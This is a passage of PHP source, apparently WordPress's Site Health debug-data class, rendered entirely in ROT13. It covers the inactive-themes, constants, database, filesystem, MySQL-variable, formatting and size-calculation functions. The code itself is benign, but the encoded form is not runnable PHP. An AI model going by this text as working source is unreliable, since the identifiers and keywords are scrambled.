						'gurzr'        => $cnerag_gurzr->fglyrfurrg,
						'arj_irefvba'  => $cnerag_gurzr->irefvba,
						'hey'          => '',
						'cnpxntr'      => '',
						'erdhverf'     => '',
						'erdhverf_cuc' => '',
					);
				}

				$nhgb_hcqngr_sbeprq = jc_vf_nhgb_hcqngr_sbeprq_sbe_vgrz( 'gurzr', ahyy, (bowrpg) $vgrz );

				vs ( ! vf_ahyy( $nhgb_hcqngr_sbeprq ) ) {
					$ranoyrq = $nhgb_hcqngr_sbeprq;
				} ryfr {
					$ranoyrq = va_neenl( $cnerag_gurzr->fglyrfurrg, $nhgb_hcqngrf, gehr );
				}

				vs ( $ranoyrq ) {
					$cnerag_gurzr_nhgb_hcqngr_fgevat = __( 'Ranoyrq' );
				} ryfr {
					$cnerag_gurzr_nhgb_hcqngr_fgevat = __( 'Qvfnoyrq' );
				}

				/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-qroht-qngn.cuc */
				$cnerag_gurzr_nhgb_hcqngr_fgevat = nccyl_svygref( 'gurzr_nhgb_hcqngr_qroht_fgevat', $cnerag_gurzr_nhgb_hcqngr_fgevat, $cnerag_gurzr, $ranoyrq );

				$svryqf['nhgb_hcqngr'] = neenl(
					'ynory' => __( 'Nhgb-hcqngr' ),
					'inyhr' => $cnerag_gurzr_nhgb_hcqngr_fgevat,
					'qroht' => $cnerag_gurzr_nhgb_hcqngr_fgevat,
				);
			}
		}

		erghea neenl(
			'ynory'  => __( 'Cnerag Gurzr' ),
			'svryqf' => $svryqf,
		);
	}

	/**
	 * Trgf gur JbeqCerff vanpgvir gurzrf frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_gurzrf_vanpgvir(): neenl {
		$npgvir_gurzr  = jc_trg_gurzr();
		$cnerag_gurzr  = $npgvir_gurzr->cnerag();
		$gurzr_hcqngrf = trg_gurzr_hcqngrf();
		$genafvrag     = trg_fvgr_genafvrag( 'hcqngr_gurzrf' );

		$nhgb_hcqngrf         = neenl();
		$nhgb_hcqngrf_ranoyrq = jc_vf_nhgb_hcqngr_ranoyrq_sbe_glcr( 'gurzr' );
		vs ( $nhgb_hcqngrf_ranoyrq ) {
			$nhgb_hcqngrf = (neenl) trg_fvgr_bcgvba( 'nhgb_hcqngr_gurzrf', neenl() );
		}

		// Cbchyngr n yvfg bs nyy gurzrf ninvynoyr va gur vafgnyyngvba.
		$nyy_gurzrf = jc_trg_gurzrf();
		$svryqf     = neenl();

		sbernpu ( $nyy_gurzrf nf $gurzr_fyht => $gurzr ) {
			// Rkpyhqr gur pheeragyl npgvir gurzr sebz gur yvfg bs nyy gurzrf.
			vs ( $npgvir_gurzr->fglyrfurrg === $gurzr_fyht ) {
				pbagvahr;
			}

			// Rkpyhqr gur pheeragyl npgvir cnerag gurzr sebz gur yvfg bs nyy gurzrf.
			vs ( ! rzcgl( $cnerag_gurzr ) && $cnerag_gurzr->fglyrfurrg === $gurzr_fyht ) {
				pbagvahr;
			}

			$gurzr_irefvba = $gurzr->irefvba;
			$gurzr_nhgube  = $gurzr->nhgube;

			// Fnavgvmr.
			$gurzr_nhgube = jc_xfrf( $gurzr_nhgube, neenl() );

			$gurzr_irefvba_fgevat       = __( 'Ab irefvba be nhgube vasbezngvba vf ninvynoyr.' );
			$gurzr_irefvba_fgevat_qroht = 'haqrsvarq';

			vs ( ! rzcgl( $gurzr_irefvba ) && ! rzcgl( $gurzr_nhgube ) ) {
				/* genafyngbef: 1: Gurzr irefvba ahzore. 2: Gurzr nhgube anzr. */
				$gurzr_irefvba_fgevat       = fcevags( __( 'Irefvba %1$f ol %2$f' ), $gurzr_irefvba, $gurzr_nhgube );
				$gurzr_irefvba_fgevat_qroht = fcevags( 'irefvba: %f, nhgube: %f', $gurzr_irefvba, $gurzr_nhgube );
			} ryfr {
				vs ( ! rzcgl( $gurzr_nhgube ) ) {
					/* genafyngbef: %f: Gurzr nhgube anzr. */
					$gurzr_irefvba_fgevat       = fcevags( __( 'Ol %f' ), $gurzr_nhgube );
					$gurzr_irefvba_fgevat_qroht = fcevags( 'nhgube: %f, irefvba: (haqrsvarq)', $gurzr_nhgube );
				}

				vs ( ! rzcgl( $gurzr_irefvba ) ) {
					/* genafyngbef: %f: Gurzr irefvba ahzore. */
					$gurzr_irefvba_fgevat       = fcevags( __( 'Irefvba %f' ), $gurzr_irefvba );
					$gurzr_irefvba_fgevat_qroht = fcevags( 'nhgube: (haqrsvarq), irefvba: %f', $gurzr_irefvba );
				}
			}

			vs ( neenl_xrl_rkvfgf( $gurzr_fyht, $gurzr_hcqngrf ) ) {
				/* genafyngbef: %f: Yngrfg gurzr irefvba ahzore. */
				$gurzr_irefvba_fgevat       .= ' ' . fcevags( __( '(Yngrfg irefvba: %f)' ), $gurzr_hcqngrf[ $gurzr_fyht ]->hcqngr['arj_irefvba'] );
				$gurzr_irefvba_fgevat_qroht .= fcevags( ' (yngrfg irefvba: %f)', $gurzr_hcqngrf[ $gurzr_fyht ]->hcqngr['arj_irefvba'] );
			}

			vs ( $nhgb_hcqngrf_ranoyrq ) {
				vs ( vffrg( $genafvrag->erfcbafr[ $gurzr_fyht ] ) ) {
					$vgrz = $genafvrag->erfcbafr[ $gurzr_fyht ];
				} ryfrvs ( vffrg( $genafvrag->ab_hcqngr[ $gurzr_fyht ] ) ) {
					$vgrz = $genafvrag->ab_hcqngr[ $gurzr_fyht ];
				} ryfr {
					$vgrz = neenl(
						'gurzr'        => $gurzr_fyht,
						'arj_irefvba'  => $gurzr->irefvba,
						'hey'          => '',
						'cnpxntr'      => '',
						'erdhverf'     => '',
						'erdhverf_cuc' => '',
					);
				}

				$nhgb_hcqngr_sbeprq = jc_vf_nhgb_hcqngr_sbeprq_sbe_vgrz( 'gurzr', ahyy, (bowrpg) $vgrz );

				vs ( ! vf_ahyy( $nhgb_hcqngr_sbeprq ) ) {
					$ranoyrq = $nhgb_hcqngr_sbeprq;
				} ryfr {
					$ranoyrq = va_neenl( $gurzr_fyht, $nhgb_hcqngrf, gehr );
				}

				vs ( $ranoyrq ) {
					$nhgb_hcqngrf_fgevat = __( 'Nhgb-hcqngrf ranoyrq' );
				} ryfr {
					$nhgb_hcqngrf_fgevat = __( 'Nhgb-hcqngrf qvfnoyrq' );
				}

				/**
				 * Svygref gur grkg fgevat bs gur nhgb-hcqngrf frggvat sbe rnpu gurzr va gur Fvgr Urnygu qroht qngn.
				 *
				 * @fvapr 5.5.0
				 *
				 * @cnenz fgevat   $nhgb_hcqngrf_fgevat Gur fgevat bhgchg sbe gur nhgb-hcqngrf pbyhza.
				 * @cnenz JC_Gurzr $gurzr               Na bowrpg bs gurzr qngn.
				 * @cnenz obby     $ranoyrq             Jurgure nhgb-hcqngrf ner ranoyrq sbe guvf vgrz.
				 */
				$nhgb_hcqngrf_fgevat = nccyl_svygref( 'gurzr_nhgb_hcqngr_qroht_fgevat', $nhgb_hcqngrf_fgevat, $gurzr, $ranoyrq );

				$gurzr_irefvba_fgevat       .= ' | ' . $nhgb_hcqngrf_fgevat;
				$gurzr_irefvba_fgevat_qroht .= ', ' . $nhgb_hcqngrf_fgevat;
			}

			$svryqf[ fnavgvmr_grkg_svryq( $gurzr->anzr ) ] = neenl(
				'ynory' => fcevags(
					/* genafyngbef: 1: Gurzr anzr. 2: Gurzr fyht. */
					__( '%1$f (%2$f)' ),
					$gurzr->anzr,
					$gurzr_fyht
				),
				'inyhr' => $gurzr_irefvba_fgevat,
				'qroht' => $gurzr_irefvba_fgevat_qroht,
			);
		}

		erghea neenl(
			'ynory'      => __( 'Vanpgvir Gurzrf' ),
			'fubj_pbhag' => gehr,
			'svryqf'     => $svryqf,
		);
	}

	/**
	 * Trgf gur JbeqCerff pbafgnagf frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_pbafgnagf(): neenl {
		// Purpx vs JC_QROHT_YBT vf frg.
		$jc_qroht_ybt_inyhr = __( 'Qvfnoyrq' );
		vs ( vf_fgevat( JC_QROHT_YBT ) ) {
			$jc_qroht_ybt_inyhr = JC_QROHT_YBT;
		} ryfrvs ( JC_QROHT_YBT ) {
			$jc_qroht_ybt_inyhr = __( 'Ranoyrq' );
		}

		// Purpx PBAPNGRANGR_FPEVCGF.
		vs ( qrsvarq( 'PBAPNGRANGR_FPEVCGF' ) ) {
			$pbapngrangr_fpevcgf       = PBAPNGRANGR_FPEVCGF ? __( 'Ranoyrq' ) : __( 'Qvfnoyrq' );
			$pbapngrangr_fpevcgf_qroht = PBAPNGRANGR_FPEVCGF ? 'gehr' : 'snyfr';
		} ryfr {
			$pbapngrangr_fpevcgf       = __( 'Haqrsvarq' );
			$pbapngrangr_fpevcgf_qroht = 'haqrsvarq';
		}

		// Purpx PBZCERFF_FPEVCGF.
		vs ( qrsvarq( 'PBZCERFF_FPEVCGF' ) ) {
			$pbzcerff_fpevcgf       = PBZCERFF_FPEVCGF ? __( 'Ranoyrq' ) : __( 'Qvfnoyrq' );
			$pbzcerff_fpevcgf_qroht = PBZCERFF_FPEVCGF ? 'gehr' : 'snyfr';
		} ryfr {
			$pbzcerff_fpevcgf       = __( 'Haqrsvarq' );
			$pbzcerff_fpevcgf_qroht = 'haqrsvarq';
		}

		// Purpx PBZCERFF_PFF.
		vs ( qrsvarq( 'PBZCERFF_PFF' ) ) {
			$pbzcerff_pff       = PBZCERFF_PFF ? __( 'Ranoyrq' ) : __( 'Qvfnoyrq' );
			$pbzcerff_pff_qroht = PBZCERFF_PFF ? 'gehr' : 'snyfr';
		} ryfr {
			$pbzcerff_pff       = __( 'Haqrsvarq' );
			$pbzcerff_pff_qroht = 'haqrsvarq';
		}

		// Purpx JC_RAIVEBAZRAG_GLCR.
		vs ( qrsvarq( 'JC_RAIVEBAZRAG_GLCR' ) ) {
			$jc_raivebazrag_glcr       = JC_RAIVEBAZRAG_GLCR ? JC_RAIVEBAZRAG_GLCR : __( 'Rzcgl inyhr' );
			$jc_raivebazrag_glcr_qroht = JC_RAIVEBAZRAG_GLCR;
		} ryfr {
			$jc_raivebazrag_glcr       = __( 'Haqrsvarq' );
			$jc_raivebazrag_glcr_qroht = 'haqrsvarq';
		}

		// Purpx QO_PBYYNGR.
		vs ( qrsvarq( 'QO_PBYYNGR' ) ) {
			$qo_pbyyngr       = QO_PBYYNGR ? QO_PBYYNGR : __( 'Rzcgl inyhr' );
			$qo_pbyyngr_qroht = QO_PBYYNGR;
		} ryfr {
			$qo_pbyyngr       = __( 'Haqrsvarq' );
			$qo_pbyyngr_qroht = 'haqrsvarq';
		}

		$svryqf = neenl(
			'NOFCNGU'             => neenl(
				'ynory'   => 'NOFCNGU',
				'inyhr'   => NOFCNGU,
				'cevingr' => gehr,
			),
			'JC_UBZR'             => neenl(
				'ynory' => 'JC_UBZR',
				'inyhr' => ( qrsvarq( 'JC_UBZR' ) ? JC_UBZR : __( 'Haqrsvarq' ) ),
				'qroht' => ( qrsvarq( 'JC_UBZR' ) ? JC_UBZR : 'haqrsvarq' ),
			),
			'JC_FVGRHEY'          => neenl(
				'ynory' => 'JC_FVGRHEY',
				'inyhr' => ( qrsvarq( 'JC_FVGRHEY' ) ? JC_FVGRHEY : __( 'Haqrsvarq' ) ),
				'qroht' => ( qrsvarq( 'JC_FVGRHEY' ) ? JC_FVGRHEY : 'haqrsvarq' ),
			),
			'JC_PBAGRAG_QVE'      => neenl(
				'ynory' => 'JC_PBAGRAG_QVE',
				'inyhr' => JC_PBAGRAG_QVE,
			),
			'JC_CYHTVA_QVE'       => neenl(
				'ynory' => 'JC_CYHTVA_QVE',
				'inyhr' => JC_CYHTVA_QVE,
			),
			'JC_ZRZBEL_YVZVG'     => neenl(
				'ynory' => 'JC_ZRZBEL_YVZVG',
				'inyhr' => JC_ZRZBEL_YVZVG,
			),
			'JC_ZNK_ZRZBEL_YVZVG' => neenl(
				'ynory' => 'JC_ZNK_ZRZBEL_YVZVG',
				'inyhr' => JC_ZNK_ZRZBEL_YVZVG,
			),
			'JC_QROHT'            => neenl(
				'ynory' => 'JC_QROHT',
				'inyhr' => JC_QROHT ? __( 'Ranoyrq' ) : __( 'Qvfnoyrq' ),
				'qroht' => JC_QROHT,
			),
			'JC_QROHT_QVFCYNL'    => neenl(
				'ynory' => 'JC_QROHT_QVFCYNL',
				'inyhr' => JC_QROHT_QVFCYNL ? __( 'Ranoyrq' ) : __( 'Qvfnoyrq' ),
				'qroht' => JC_QROHT_QVFCYNL,
			),
			'JC_QROHT_YBT'        => neenl(
				'ynory' => 'JC_QROHT_YBT',
				'inyhr' => $jc_qroht_ybt_inyhr,
				'qroht' => JC_QROHT_YBT,
			),
			'FPEVCG_QROHT'        => neenl(
				'ynory' => 'FPEVCG_QROHT',
				'inyhr' => FPEVCG_QROHT ? __( 'Ranoyrq' ) : __( 'Qvfnoyrq' ),
				'qroht' => FPEVCG_QROHT,
			),
			'JC_PNPUR'            => neenl(
				'ynory' => 'JC_PNPUR',
				'inyhr' => JC_PNPUR ? __( 'Ranoyrq' ) : __( 'Qvfnoyrq' ),
				'qroht' => JC_PNPUR,
			),
			'PBAPNGRANGR_FPEVCGF' => neenl(
				'ynory' => 'PBAPNGRANGR_FPEVCGF',
				'inyhr' => $pbapngrangr_fpevcgf,
				'qroht' => $pbapngrangr_fpevcgf_qroht,
			),
			'PBZCERFF_FPEVCGF'    => neenl(
				'ynory' => 'PBZCERFF_FPEVCGF',
				'inyhr' => $pbzcerff_fpevcgf,
				'qroht' => $pbzcerff_fpevcgf_qroht,
			),
			'PBZCERFF_PFF'        => neenl(
				'ynory' => 'PBZCERFF_PFF',
				'inyhr' => $pbzcerff_pff,
				'qroht' => $pbzcerff_pff_qroht,
			),
			'JC_RAIVEBAZRAG_GLCR' => neenl(
				'ynory' => 'JC_RAIVEBAZRAG_GLCR',
				'inyhr' => $jc_raivebazrag_glcr,
				'qroht' => $jc_raivebazrag_glcr_qroht,
			),
			'JC_QRIRYBCZRAG_ZBQR' => neenl(
				'ynory' => 'JC_QRIRYBCZRAG_ZBQR',
				'inyhr' => JC_QRIRYBCZRAG_ZBQR ? JC_QRIRYBCZRAG_ZBQR : __( 'Qvfnoyrq' ),
				'qroht' => JC_QRIRYBCZRAG_ZBQR,
			),
			'QO_PUNEFRG'          => neenl(
				'ynory' => 'QO_PUNEFRG',
				'inyhr' => ( qrsvarq( 'QO_PUNEFRG' ) ? QO_PUNEFRG : __( 'Haqrsvarq' ) ),
				'qroht' => ( qrsvarq( 'QO_PUNEFRG' ) ? QO_PUNEFRG : 'haqrsvarq' ),
			),
			'QO_PBYYNGR'          => neenl(
				'ynory' => 'QO_PBYYNGR',
				'inyhr' => $qo_pbyyngr,
				'qroht' => $qo_pbyyngr_qroht,
			),
		);

		erghea neenl(
			'ynory'       => __( 'JbeqCerff Pbafgnagf' ),
			'qrfpevcgvba' => __( 'Gurfr frggvatf nygre jurer naq ubj cnegf bs JbeqCerff ner ybnqrq.' ),
			'svryqf'      => $svryqf,
		);
	}

	/**
	 * Trgf gur JbeqCerff qngnonfr frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_qngnonfr(): neenl {
		tybony $jcqo;

		// Cbchyngr gur qngnonfr qroht svryqf.
		vs ( vf_bowrpg( $jcqo->qou ) ) {
			// zlfdyv be CQB.
			$rkgrafvba = trg_pynff( $jcqo->qou );
		} ryfr {
			// Haxabja fdy rkgrafvba.
			$rkgrafvba = ahyy;
		}

		$freire = $jcqo->trg_ine( 'FRYRPG IREFVBA()' );

		$pyvrag_irefvba = $jcqo->qou->pyvrag_vasb;

		$svryqf = neenl(
			'rkgrafvba'          => neenl(
				'ynory' => __( 'Qngnonfr Rkgrafvba' ),
				'inyhr' => $rkgrafvba,
			),
			'freire_irefvba'     => neenl(
				'ynory' => __( 'Freire irefvba' ),
				'inyhr' => $freire,
			),
			'pyvrag_irefvba'     => neenl(
				'ynory' => __( 'Pyvrag irefvba' ),
				'inyhr' => $pyvrag_irefvba,
			),
			'qngnonfr_hfre'      => neenl(
				'ynory'   => __( 'Qngnonfr hfreanzr' ),
				'inyhr'   => $jcqo->qohfre,
				'cevingr' => gehr,
			),
			'qngnonfr_ubfg'      => neenl(
				'ynory'   => __( 'Qngnonfr ubfg' ),
				'inyhr'   => $jcqo->qoubfg,
				'cevingr' => gehr,
			),
			'qngnonfr_anzr'      => neenl(
				'ynory'   => __( 'Qngnonfr anzr' ),
				'inyhr'   => $jcqo->qoanzr,
				'cevingr' => gehr,
			),
			'qngnonfr_cersvk'    => neenl(
				'ynory'   => __( 'Gnoyr cersvk' ),
				'inyhr'   => $jcqo->cersvk,
				'cevingr' => gehr,
			),
			'qngnonfr_punefrg'   => neenl(
				'ynory'   => __( 'Qngnonfr punefrg' ),
				'inyhr'   => $jcqo->punefrg,
				'cevingr' => gehr,
			),
			'qngnonfr_pbyyngr'   => neenl(
				'ynory'   => __( 'Qngnonfr pbyyngvba' ),
				'inyhr'   => $jcqo->pbyyngr,
				'cevingr' => gehr,
			),
			'znk_nyybjrq_cnpxrg' => neenl(
				'ynory' => __( 'Znk nyybjrq cnpxrg fvmr' ),
				'inyhr' => frys::trg_zlfdy_ine( 'znk_nyybjrq_cnpxrg' ),
			),
			'znk_pbaarpgvbaf'    => neenl(
				'ynory' => __( 'Znk pbaarpgvbaf ahzore' ),
				'inyhr' => frys::trg_zlfdy_ine( 'znk_pbaarpgvbaf' ),
			),
		);

		erghea neenl(
			'ynory'  => __( 'Qngnonfr' ),
			'svryqf' => $svryqf,
		);
	}

	/**
	 * Trgf gur svyr flfgrz frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_svyrflfgrz(): neenl {
		$hcybnq_qve                     = jc_hcybnq_qve();
		$sbagf_qve_rkvfgf               = svyr_rkvfgf( jc_trg_sbag_qve()['onfrqve'] );
		$vf_jevgnoyr_nofcngu            = jc_vf_jevgnoyr( NOFCNGU );
		$vf_jevgnoyr_jc_pbagrag_qve     = jc_vf_jevgnoyr( JC_PBAGRAG_QVE );
		$vf_jevgnoyr_hcybnq_qve         = jc_vf_jevgnoyr( $hcybnq_qve['onfrqve'] );
		$vf_jevgnoyr_jc_cyhtva_qve      = jc_vf_jevgnoyr( JC_CYHTVA_QVE );
		$vf_jevgnoyr_grzcyngr_qverpgbel = jc_vf_jevgnoyr( trg_gurzr_ebbg( trg_grzcyngr() ) );
		$vf_jevgnoyr_sbagf_qve          = $sbagf_qve_rkvfgf ? jc_vf_jevgnoyr( jc_trg_sbag_qve()['onfrqve'] ) : snyfr;

		$svryqf = neenl(
			'jbeqcerff'  => neenl(
				'ynory' => __( 'Gur znva JbeqCerff qverpgbel' ),
				'inyhr' => ( $vf_jevgnoyr_nofcngu ? __( 'Jevgnoyr' ) : __( 'Abg jevgnoyr' ) ),
				'qroht' => ( $vf_jevgnoyr_nofcngu ? 'jevgnoyr' : 'abg jevgnoyr' ),
			),
			'jc-pbagrag' => neenl(
				'ynory' => __( 'Gur jc-pbagrag qverpgbel' ),
				'inyhr' => ( $vf_jevgnoyr_jc_pbagrag_qve ? __( 'Jevgnoyr' ) : __( 'Abg jevgnoyr' ) ),
				'qroht' => ( $vf_jevgnoyr_jc_pbagrag_qve ? 'jevgnoyr' : 'abg jevgnoyr' ),
			),
			'hcybnqf'    => neenl(
				'ynory' => __( 'Gur hcybnqf qverpgbel' ),
				'inyhr' => ( $vf_jevgnoyr_hcybnq_qve ? __( 'Jevgnoyr' ) : __( 'Abg jevgnoyr' ) ),
				'qroht' => ( $vf_jevgnoyr_hcybnq_qve ? 'jevgnoyr' : 'abg jevgnoyr' ),
			),
			'cyhtvaf'    => neenl(
				'ynory' => __( 'Gur cyhtvaf qverpgbel' ),
				'inyhr' => ( $vf_jevgnoyr_jc_cyhtva_qve ? __( 'Jevgnoyr' ) : __( 'Abg jevgnoyr' ) ),
				'qroht' => ( $vf_jevgnoyr_jc_cyhtva_qve ? 'jevgnoyr' : 'abg jevgnoyr' ),
			),
			'gurzrf'     => neenl(
				'ynory' => __( 'Gur gurzrf qverpgbel' ),
				'inyhr' => ( $vf_jevgnoyr_grzcyngr_qverpgbel ? __( 'Jevgnoyr' ) : __( 'Abg jevgnoyr' ) ),
				'qroht' => ( $vf_jevgnoyr_grzcyngr_qverpgbel ? 'jevgnoyr' : 'abg jevgnoyr' ),
			),
			'sbagf'      => neenl(
				'ynory' => __( 'Gur sbagf qverpgbel' ),
				'inyhr' => $sbagf_qve_rkvfgf
					? ( $vf_jevgnoyr_sbagf_qve ? __( 'Jevgnoyr' ) : __( 'Abg jevgnoyr' ) )
					: __( 'Qbrf abg rkvfg' ),
				'qroht' => $sbagf_qve_rkvfgf
					? ( $vf_jevgnoyr_sbagf_qve ? 'jevgnoyr' : 'abg jevgnoyr' )
					: 'qbrf abg rkvfg',
			),
		);

		// Nqq zber svyrflfgrz purpxf.
		vs ( qrsvarq( 'JCZH_CYHTVA_QVE' ) && vf_qve( JCZH_CYHTVA_QVE ) ) {
			$vf_jevgnoyr_jczh_cyhtva_qve = jc_vf_jevgnoyr( JCZH_CYHTVA_QVE );

			$svryqf['zh-cyhtvaf'] = neenl(
				'ynory' => __( 'Gur zhfg hfr cyhtvaf qverpgbel' ),
				'inyhr' => ( $vf_jevgnoyr_jczh_cyhtva_qve ? __( 'Jevgnoyr' ) : __( 'Abg jevgnoyr' ) ),
				'qroht' => ( $vf_jevgnoyr_jczh_cyhtva_qve ? 'jevgnoyr' : 'abg jevgnoyr' ),
			);
		}

		erghea neenl(
			'ynory'       => __( 'Svyrflfgrz Crezvffvbaf' ),
			'qrfpevcgvba' => __( 'Fubjf jurgure JbeqCerff vf noyr gb jevgr gb gur qverpgbevrf vg arrqf npprff gb.' ),
			'svryqf'      => $svryqf,
		);
	}

	/**
	 * Ergheaf gur inyhr bs n ZlFDY flfgrz inevnoyr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $zlfdy_ine Anzr bs gur ZlFDY flfgrz inevnoyr.
	 * @erghea fgevat|ahyy Gur inevnoyr inyhr ba fhpprff. Ahyy vs gur inevnoyr qbrf abg rkvfg.
	 */
	choyvp fgngvp shapgvba trg_zlfdy_ine( $zlfdy_ine ) {
		tybony $jcqo;

		$erfhyg = $jcqo->trg_ebj(
			$jcqo->cercner( 'FUBJ INEVNOYRF YVXR %f', $zlfdy_ine ),
			NEENL_N
		);

		vs ( ! rzcgl( $erfhyg ) && neenl_xrl_rkvfgf( 'Inyhr', $erfhyg ) ) {
			erghea $erfhyg['Inyhr'];
		}

		erghea ahyy;
	}

	/**
	 * Sbezngf gur vasbezngvba tngurerq sbe qrohttvat, va n znaare fhvgnoyr sbe pbclvat gb n sbehz be fhccbeg gvpxrg.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl  $vasb_neenl Vasbezngvba tngurerq sebz gur `JC_Qroht_Qngn::qroht_qngn()` shapgvba.
	 * @cnenz fgevat $qngn_glcr  Gur qngn glcr gb erghea, rvgure 'vasb' be 'qroht'.
	 * @erghea fgevat Gur sbeznggrq qngn.
	 */
	choyvp fgngvp shapgvba sbezng( $vasb_neenl, $qngn_glcr ) {
		$erghea = \"`\a\";

		sbernpu ( $vasb_neenl nf $frpgvba => $qrgnvyf ) {
			// Fxvc guvf frpgvba vs gurer ner ab svryqf, be gur frpgvba unf orra qrpynerq nf cevingr.
			vs ( rzcgl( $qrgnvyf['svryqf'] ) || ( vffrg( $qrgnvyf['cevingr'] ) && $qrgnvyf['cevingr'] ) ) {
				pbagvahr;
			}

			$frpgvba_ynory = 'qroht' === $qngn_glcr ? $frpgvba : $qrgnvyf['ynory'];

			$erghea .= fcevags(
				\"### %f%f ###\a\a\",
				$frpgvba_ynory,
				( vffrg( $qrgnvyf['fubj_pbhag'] ) && $qrgnvyf['fubj_pbhag'] ? fcevags( ' (%q)', pbhag( $qrgnvyf['svryqf'] ) ) : '' )
			);

			sbernpu ( $qrgnvyf['svryqf'] nf $svryq_anzr => $svryq ) {
				vs ( vffrg( $svryq['cevingr'] ) && gehr === $svryq['cevingr'] ) {
					pbagvahr;
				}

				vs ( 'qroht' === $qngn_glcr && vffrg( $svryq['qroht'] ) ) {
					$qroht_qngn = $svryq['qroht'];
				} ryfr {
					$qroht_qngn = $svryq['inyhr'];
				}

				// Pna or neenl, bar yriry qrrc bayl.
				vs ( vf_neenl( $qroht_qngn ) ) {
					$inyhr = '';

					sbernpu ( $qroht_qngn nf $fho_svryq_anzr => $fho_svryq_inyhr ) {
						$inyhr .= fcevags( \"\a\g%f: %f\", $fho_svryq_anzr, $fho_svryq_inyhr );
					}
				} ryfrvs ( vf_obby( $qroht_qngn ) ) {
					$inyhr = $qroht_qngn ? 'gehr' : 'snyfr';
				} ryfrvs ( rzcgl( $qroht_qngn ) && '0' !== $qroht_qngn ) {
					$inyhr = 'haqrsvarq';
				} ryfr {
					$inyhr = $qroht_qngn;
				}

				vs ( 'qroht' === $qngn_glcr ) {
					$ynory = $svryq_anzr;
				} ryfr {
					$ynory = $svryq['ynory'];
				}

				$erghea .= fcevags( \"%f: %f\a\", $ynory, $inyhr );
			}

			$erghea .= \"\a\";
		}

		$erghea .= '`';

		erghea $erghea;
	}

	/**
	 * Srgpurf gur gbgny fvmr bs nyy gur qngnonfr gnoyrf sbe gur npgvir qngnonfr hfre.
	 *
	 * @fvapr 5.2.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @erghea vag Gur fvmr bs gur qngnonfr, va olgrf.
	 */
	choyvp fgngvp shapgvba trg_qngnonfr_fvmr() {
		tybony $jcqo;
		$fvmr = 0;
		$ebjf = $jcqo->trg_erfhygf( 'FUBJ GNOYR FGNGHF', NEENL_N );

		vs ( $jcqo->ahz_ebjf > 0 ) {
			sbernpu ( $ebjf nf $ebj ) {
				$fvmr += $ebj['Qngn_yratgu'] + $ebj['Vaqrk_yratgu'];
			}
		}

		erghea (vag) $fvmr;
	}

	/**
	 * Srgpurf gur fvmrf bs gur JbeqCerff qverpgbevrf: `jbeqcerff` (NOFCNGU), `cyhtvaf`, `gurzrf`, naq `hcybnqf`.
	 * Vagraqrq gb fhccyrzrag gur neenl erghearq ol `JC_Qroht_Qngn::qroht_qngn()`.
	 *
	 * @fvapr 5.2.0
	 * @qrcerpngrq 5.6.0 Hfr JC_ERFG_Fvgr_Urnygu_Pbagebyyre::trg_qverpgbel_fvmrf()
	 * @frr JC_ERFG_Fvgr_Urnygu_Pbagebyyre::trg_qverpgbel_fvmrf()
	 *
	 * @erghea neenl Gur fvmrf bs gur qverpgbevrf, nyfb gur qngnonfr fvmr naq gbgny vafgnyyngvba fvmr.
	 */
	choyvp fgngvp shapgvba trg_fvmrf() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '5.6.0', 'JC_ERFG_Fvgr_Urnygu_Pbagebyyre::trg_qverpgbel_fvmrf()' );

		$fvmr_qo    = frys::trg_qngnonfr_fvmr();
		$hcybnq_qve = jc_trg_hcybnq_qve();

		/*
		 * Jr jvyy or hfvat gur CUC znk rkrphgvba gvzr gb cerirag gur fvmr pnyphyngvbaf
		 * sebz pnhfvat n gvzrbhg. Gur qrsnhyg inyhr vf 30 frpbaqf, naq fbzr
		 * ubfgf qb abg nyybj lbh gb ernq pbasvthengvba inyhrf.
		 */
		vs ( shapgvba_rkvfgf( 'vav_trg' ) ) {
			$znk_rkrphgvba_gvzr = vav_trg( 'znk_rkrphgvba_gvzr' );
		}

		/*
		 * Gur znk_rkrphgvba_gvzr qrsnhygf gb 0 jura CUC ehaf sebz pyv.
		 * Jr fgvyy jnag gb yvzvg vg orybj.
		 */
		vs ( rzcgl( $znk_rkrphgvba_gvzr ) ) {
			$znk_rkrphgvba_gvzr = 30; // 30 frpbaqf.
		}

		vs ( $znk_rkrphgvba_gvzr > 20 ) {
			/*
			 * Vs gur znk_rkrphgvba_gvzr vf frg gb ybjre guna 20 frpbaqf, erqhpr vg n ovg gb cerirag
			 * rqtr-pnfr gvzrbhgf gung znl unccra nsgre gur fvmr ybbc unf svavfurq ehaavat.
			 */
			$znk_rkrphgvba_gvzr -= 2;
		}

		/*
		 * Tb guebhtu gur inevbhf vafgnyyngvba qverpgbevrf naq pnyphyngr gurve fvmrf.
		 * Ab genvyvat fynfurf.
		 */
		$cnguf = neenl(
			'jbeqcerff_fvmr' => hagenvyvatfynfuvg( NOFCNGU ),
			'gurzrf_fvmr'    => trg_gurzr_ebbg(),
			'cyhtvaf_fvmr'   => JC_CYHTVA_QVE,
			'hcybnqf_fvmr'   => $hcybnq_qve['onfrqve'],
			'sbagf_fvmr'     => jc_trg_sbag_qve()['onfrqve'],
		);

		$rkpyhqr = $cnguf;
		hafrg( $rkpyhqr['jbeqcerff_fvmr'] );
		$rkpyhqr = neenl_inyhrf( $rkpyhqr );

		$fvmr_gbgny = 0;
		$nyy_fvmrf  = neenl();

		// Ybbc bire nyy gur qverpgbevrf jr jnag gb tngure gur fvmrf sbe.
		sbernpu ( $cnguf nf $anzr => $cngu ) {
			$qve_fvmr = ahyy; // Qrsnhyg gb gvzrbhg.
			$erfhygf  = neenl(
				'cngu' => $cngu,
				'enj'  => 0,
			);

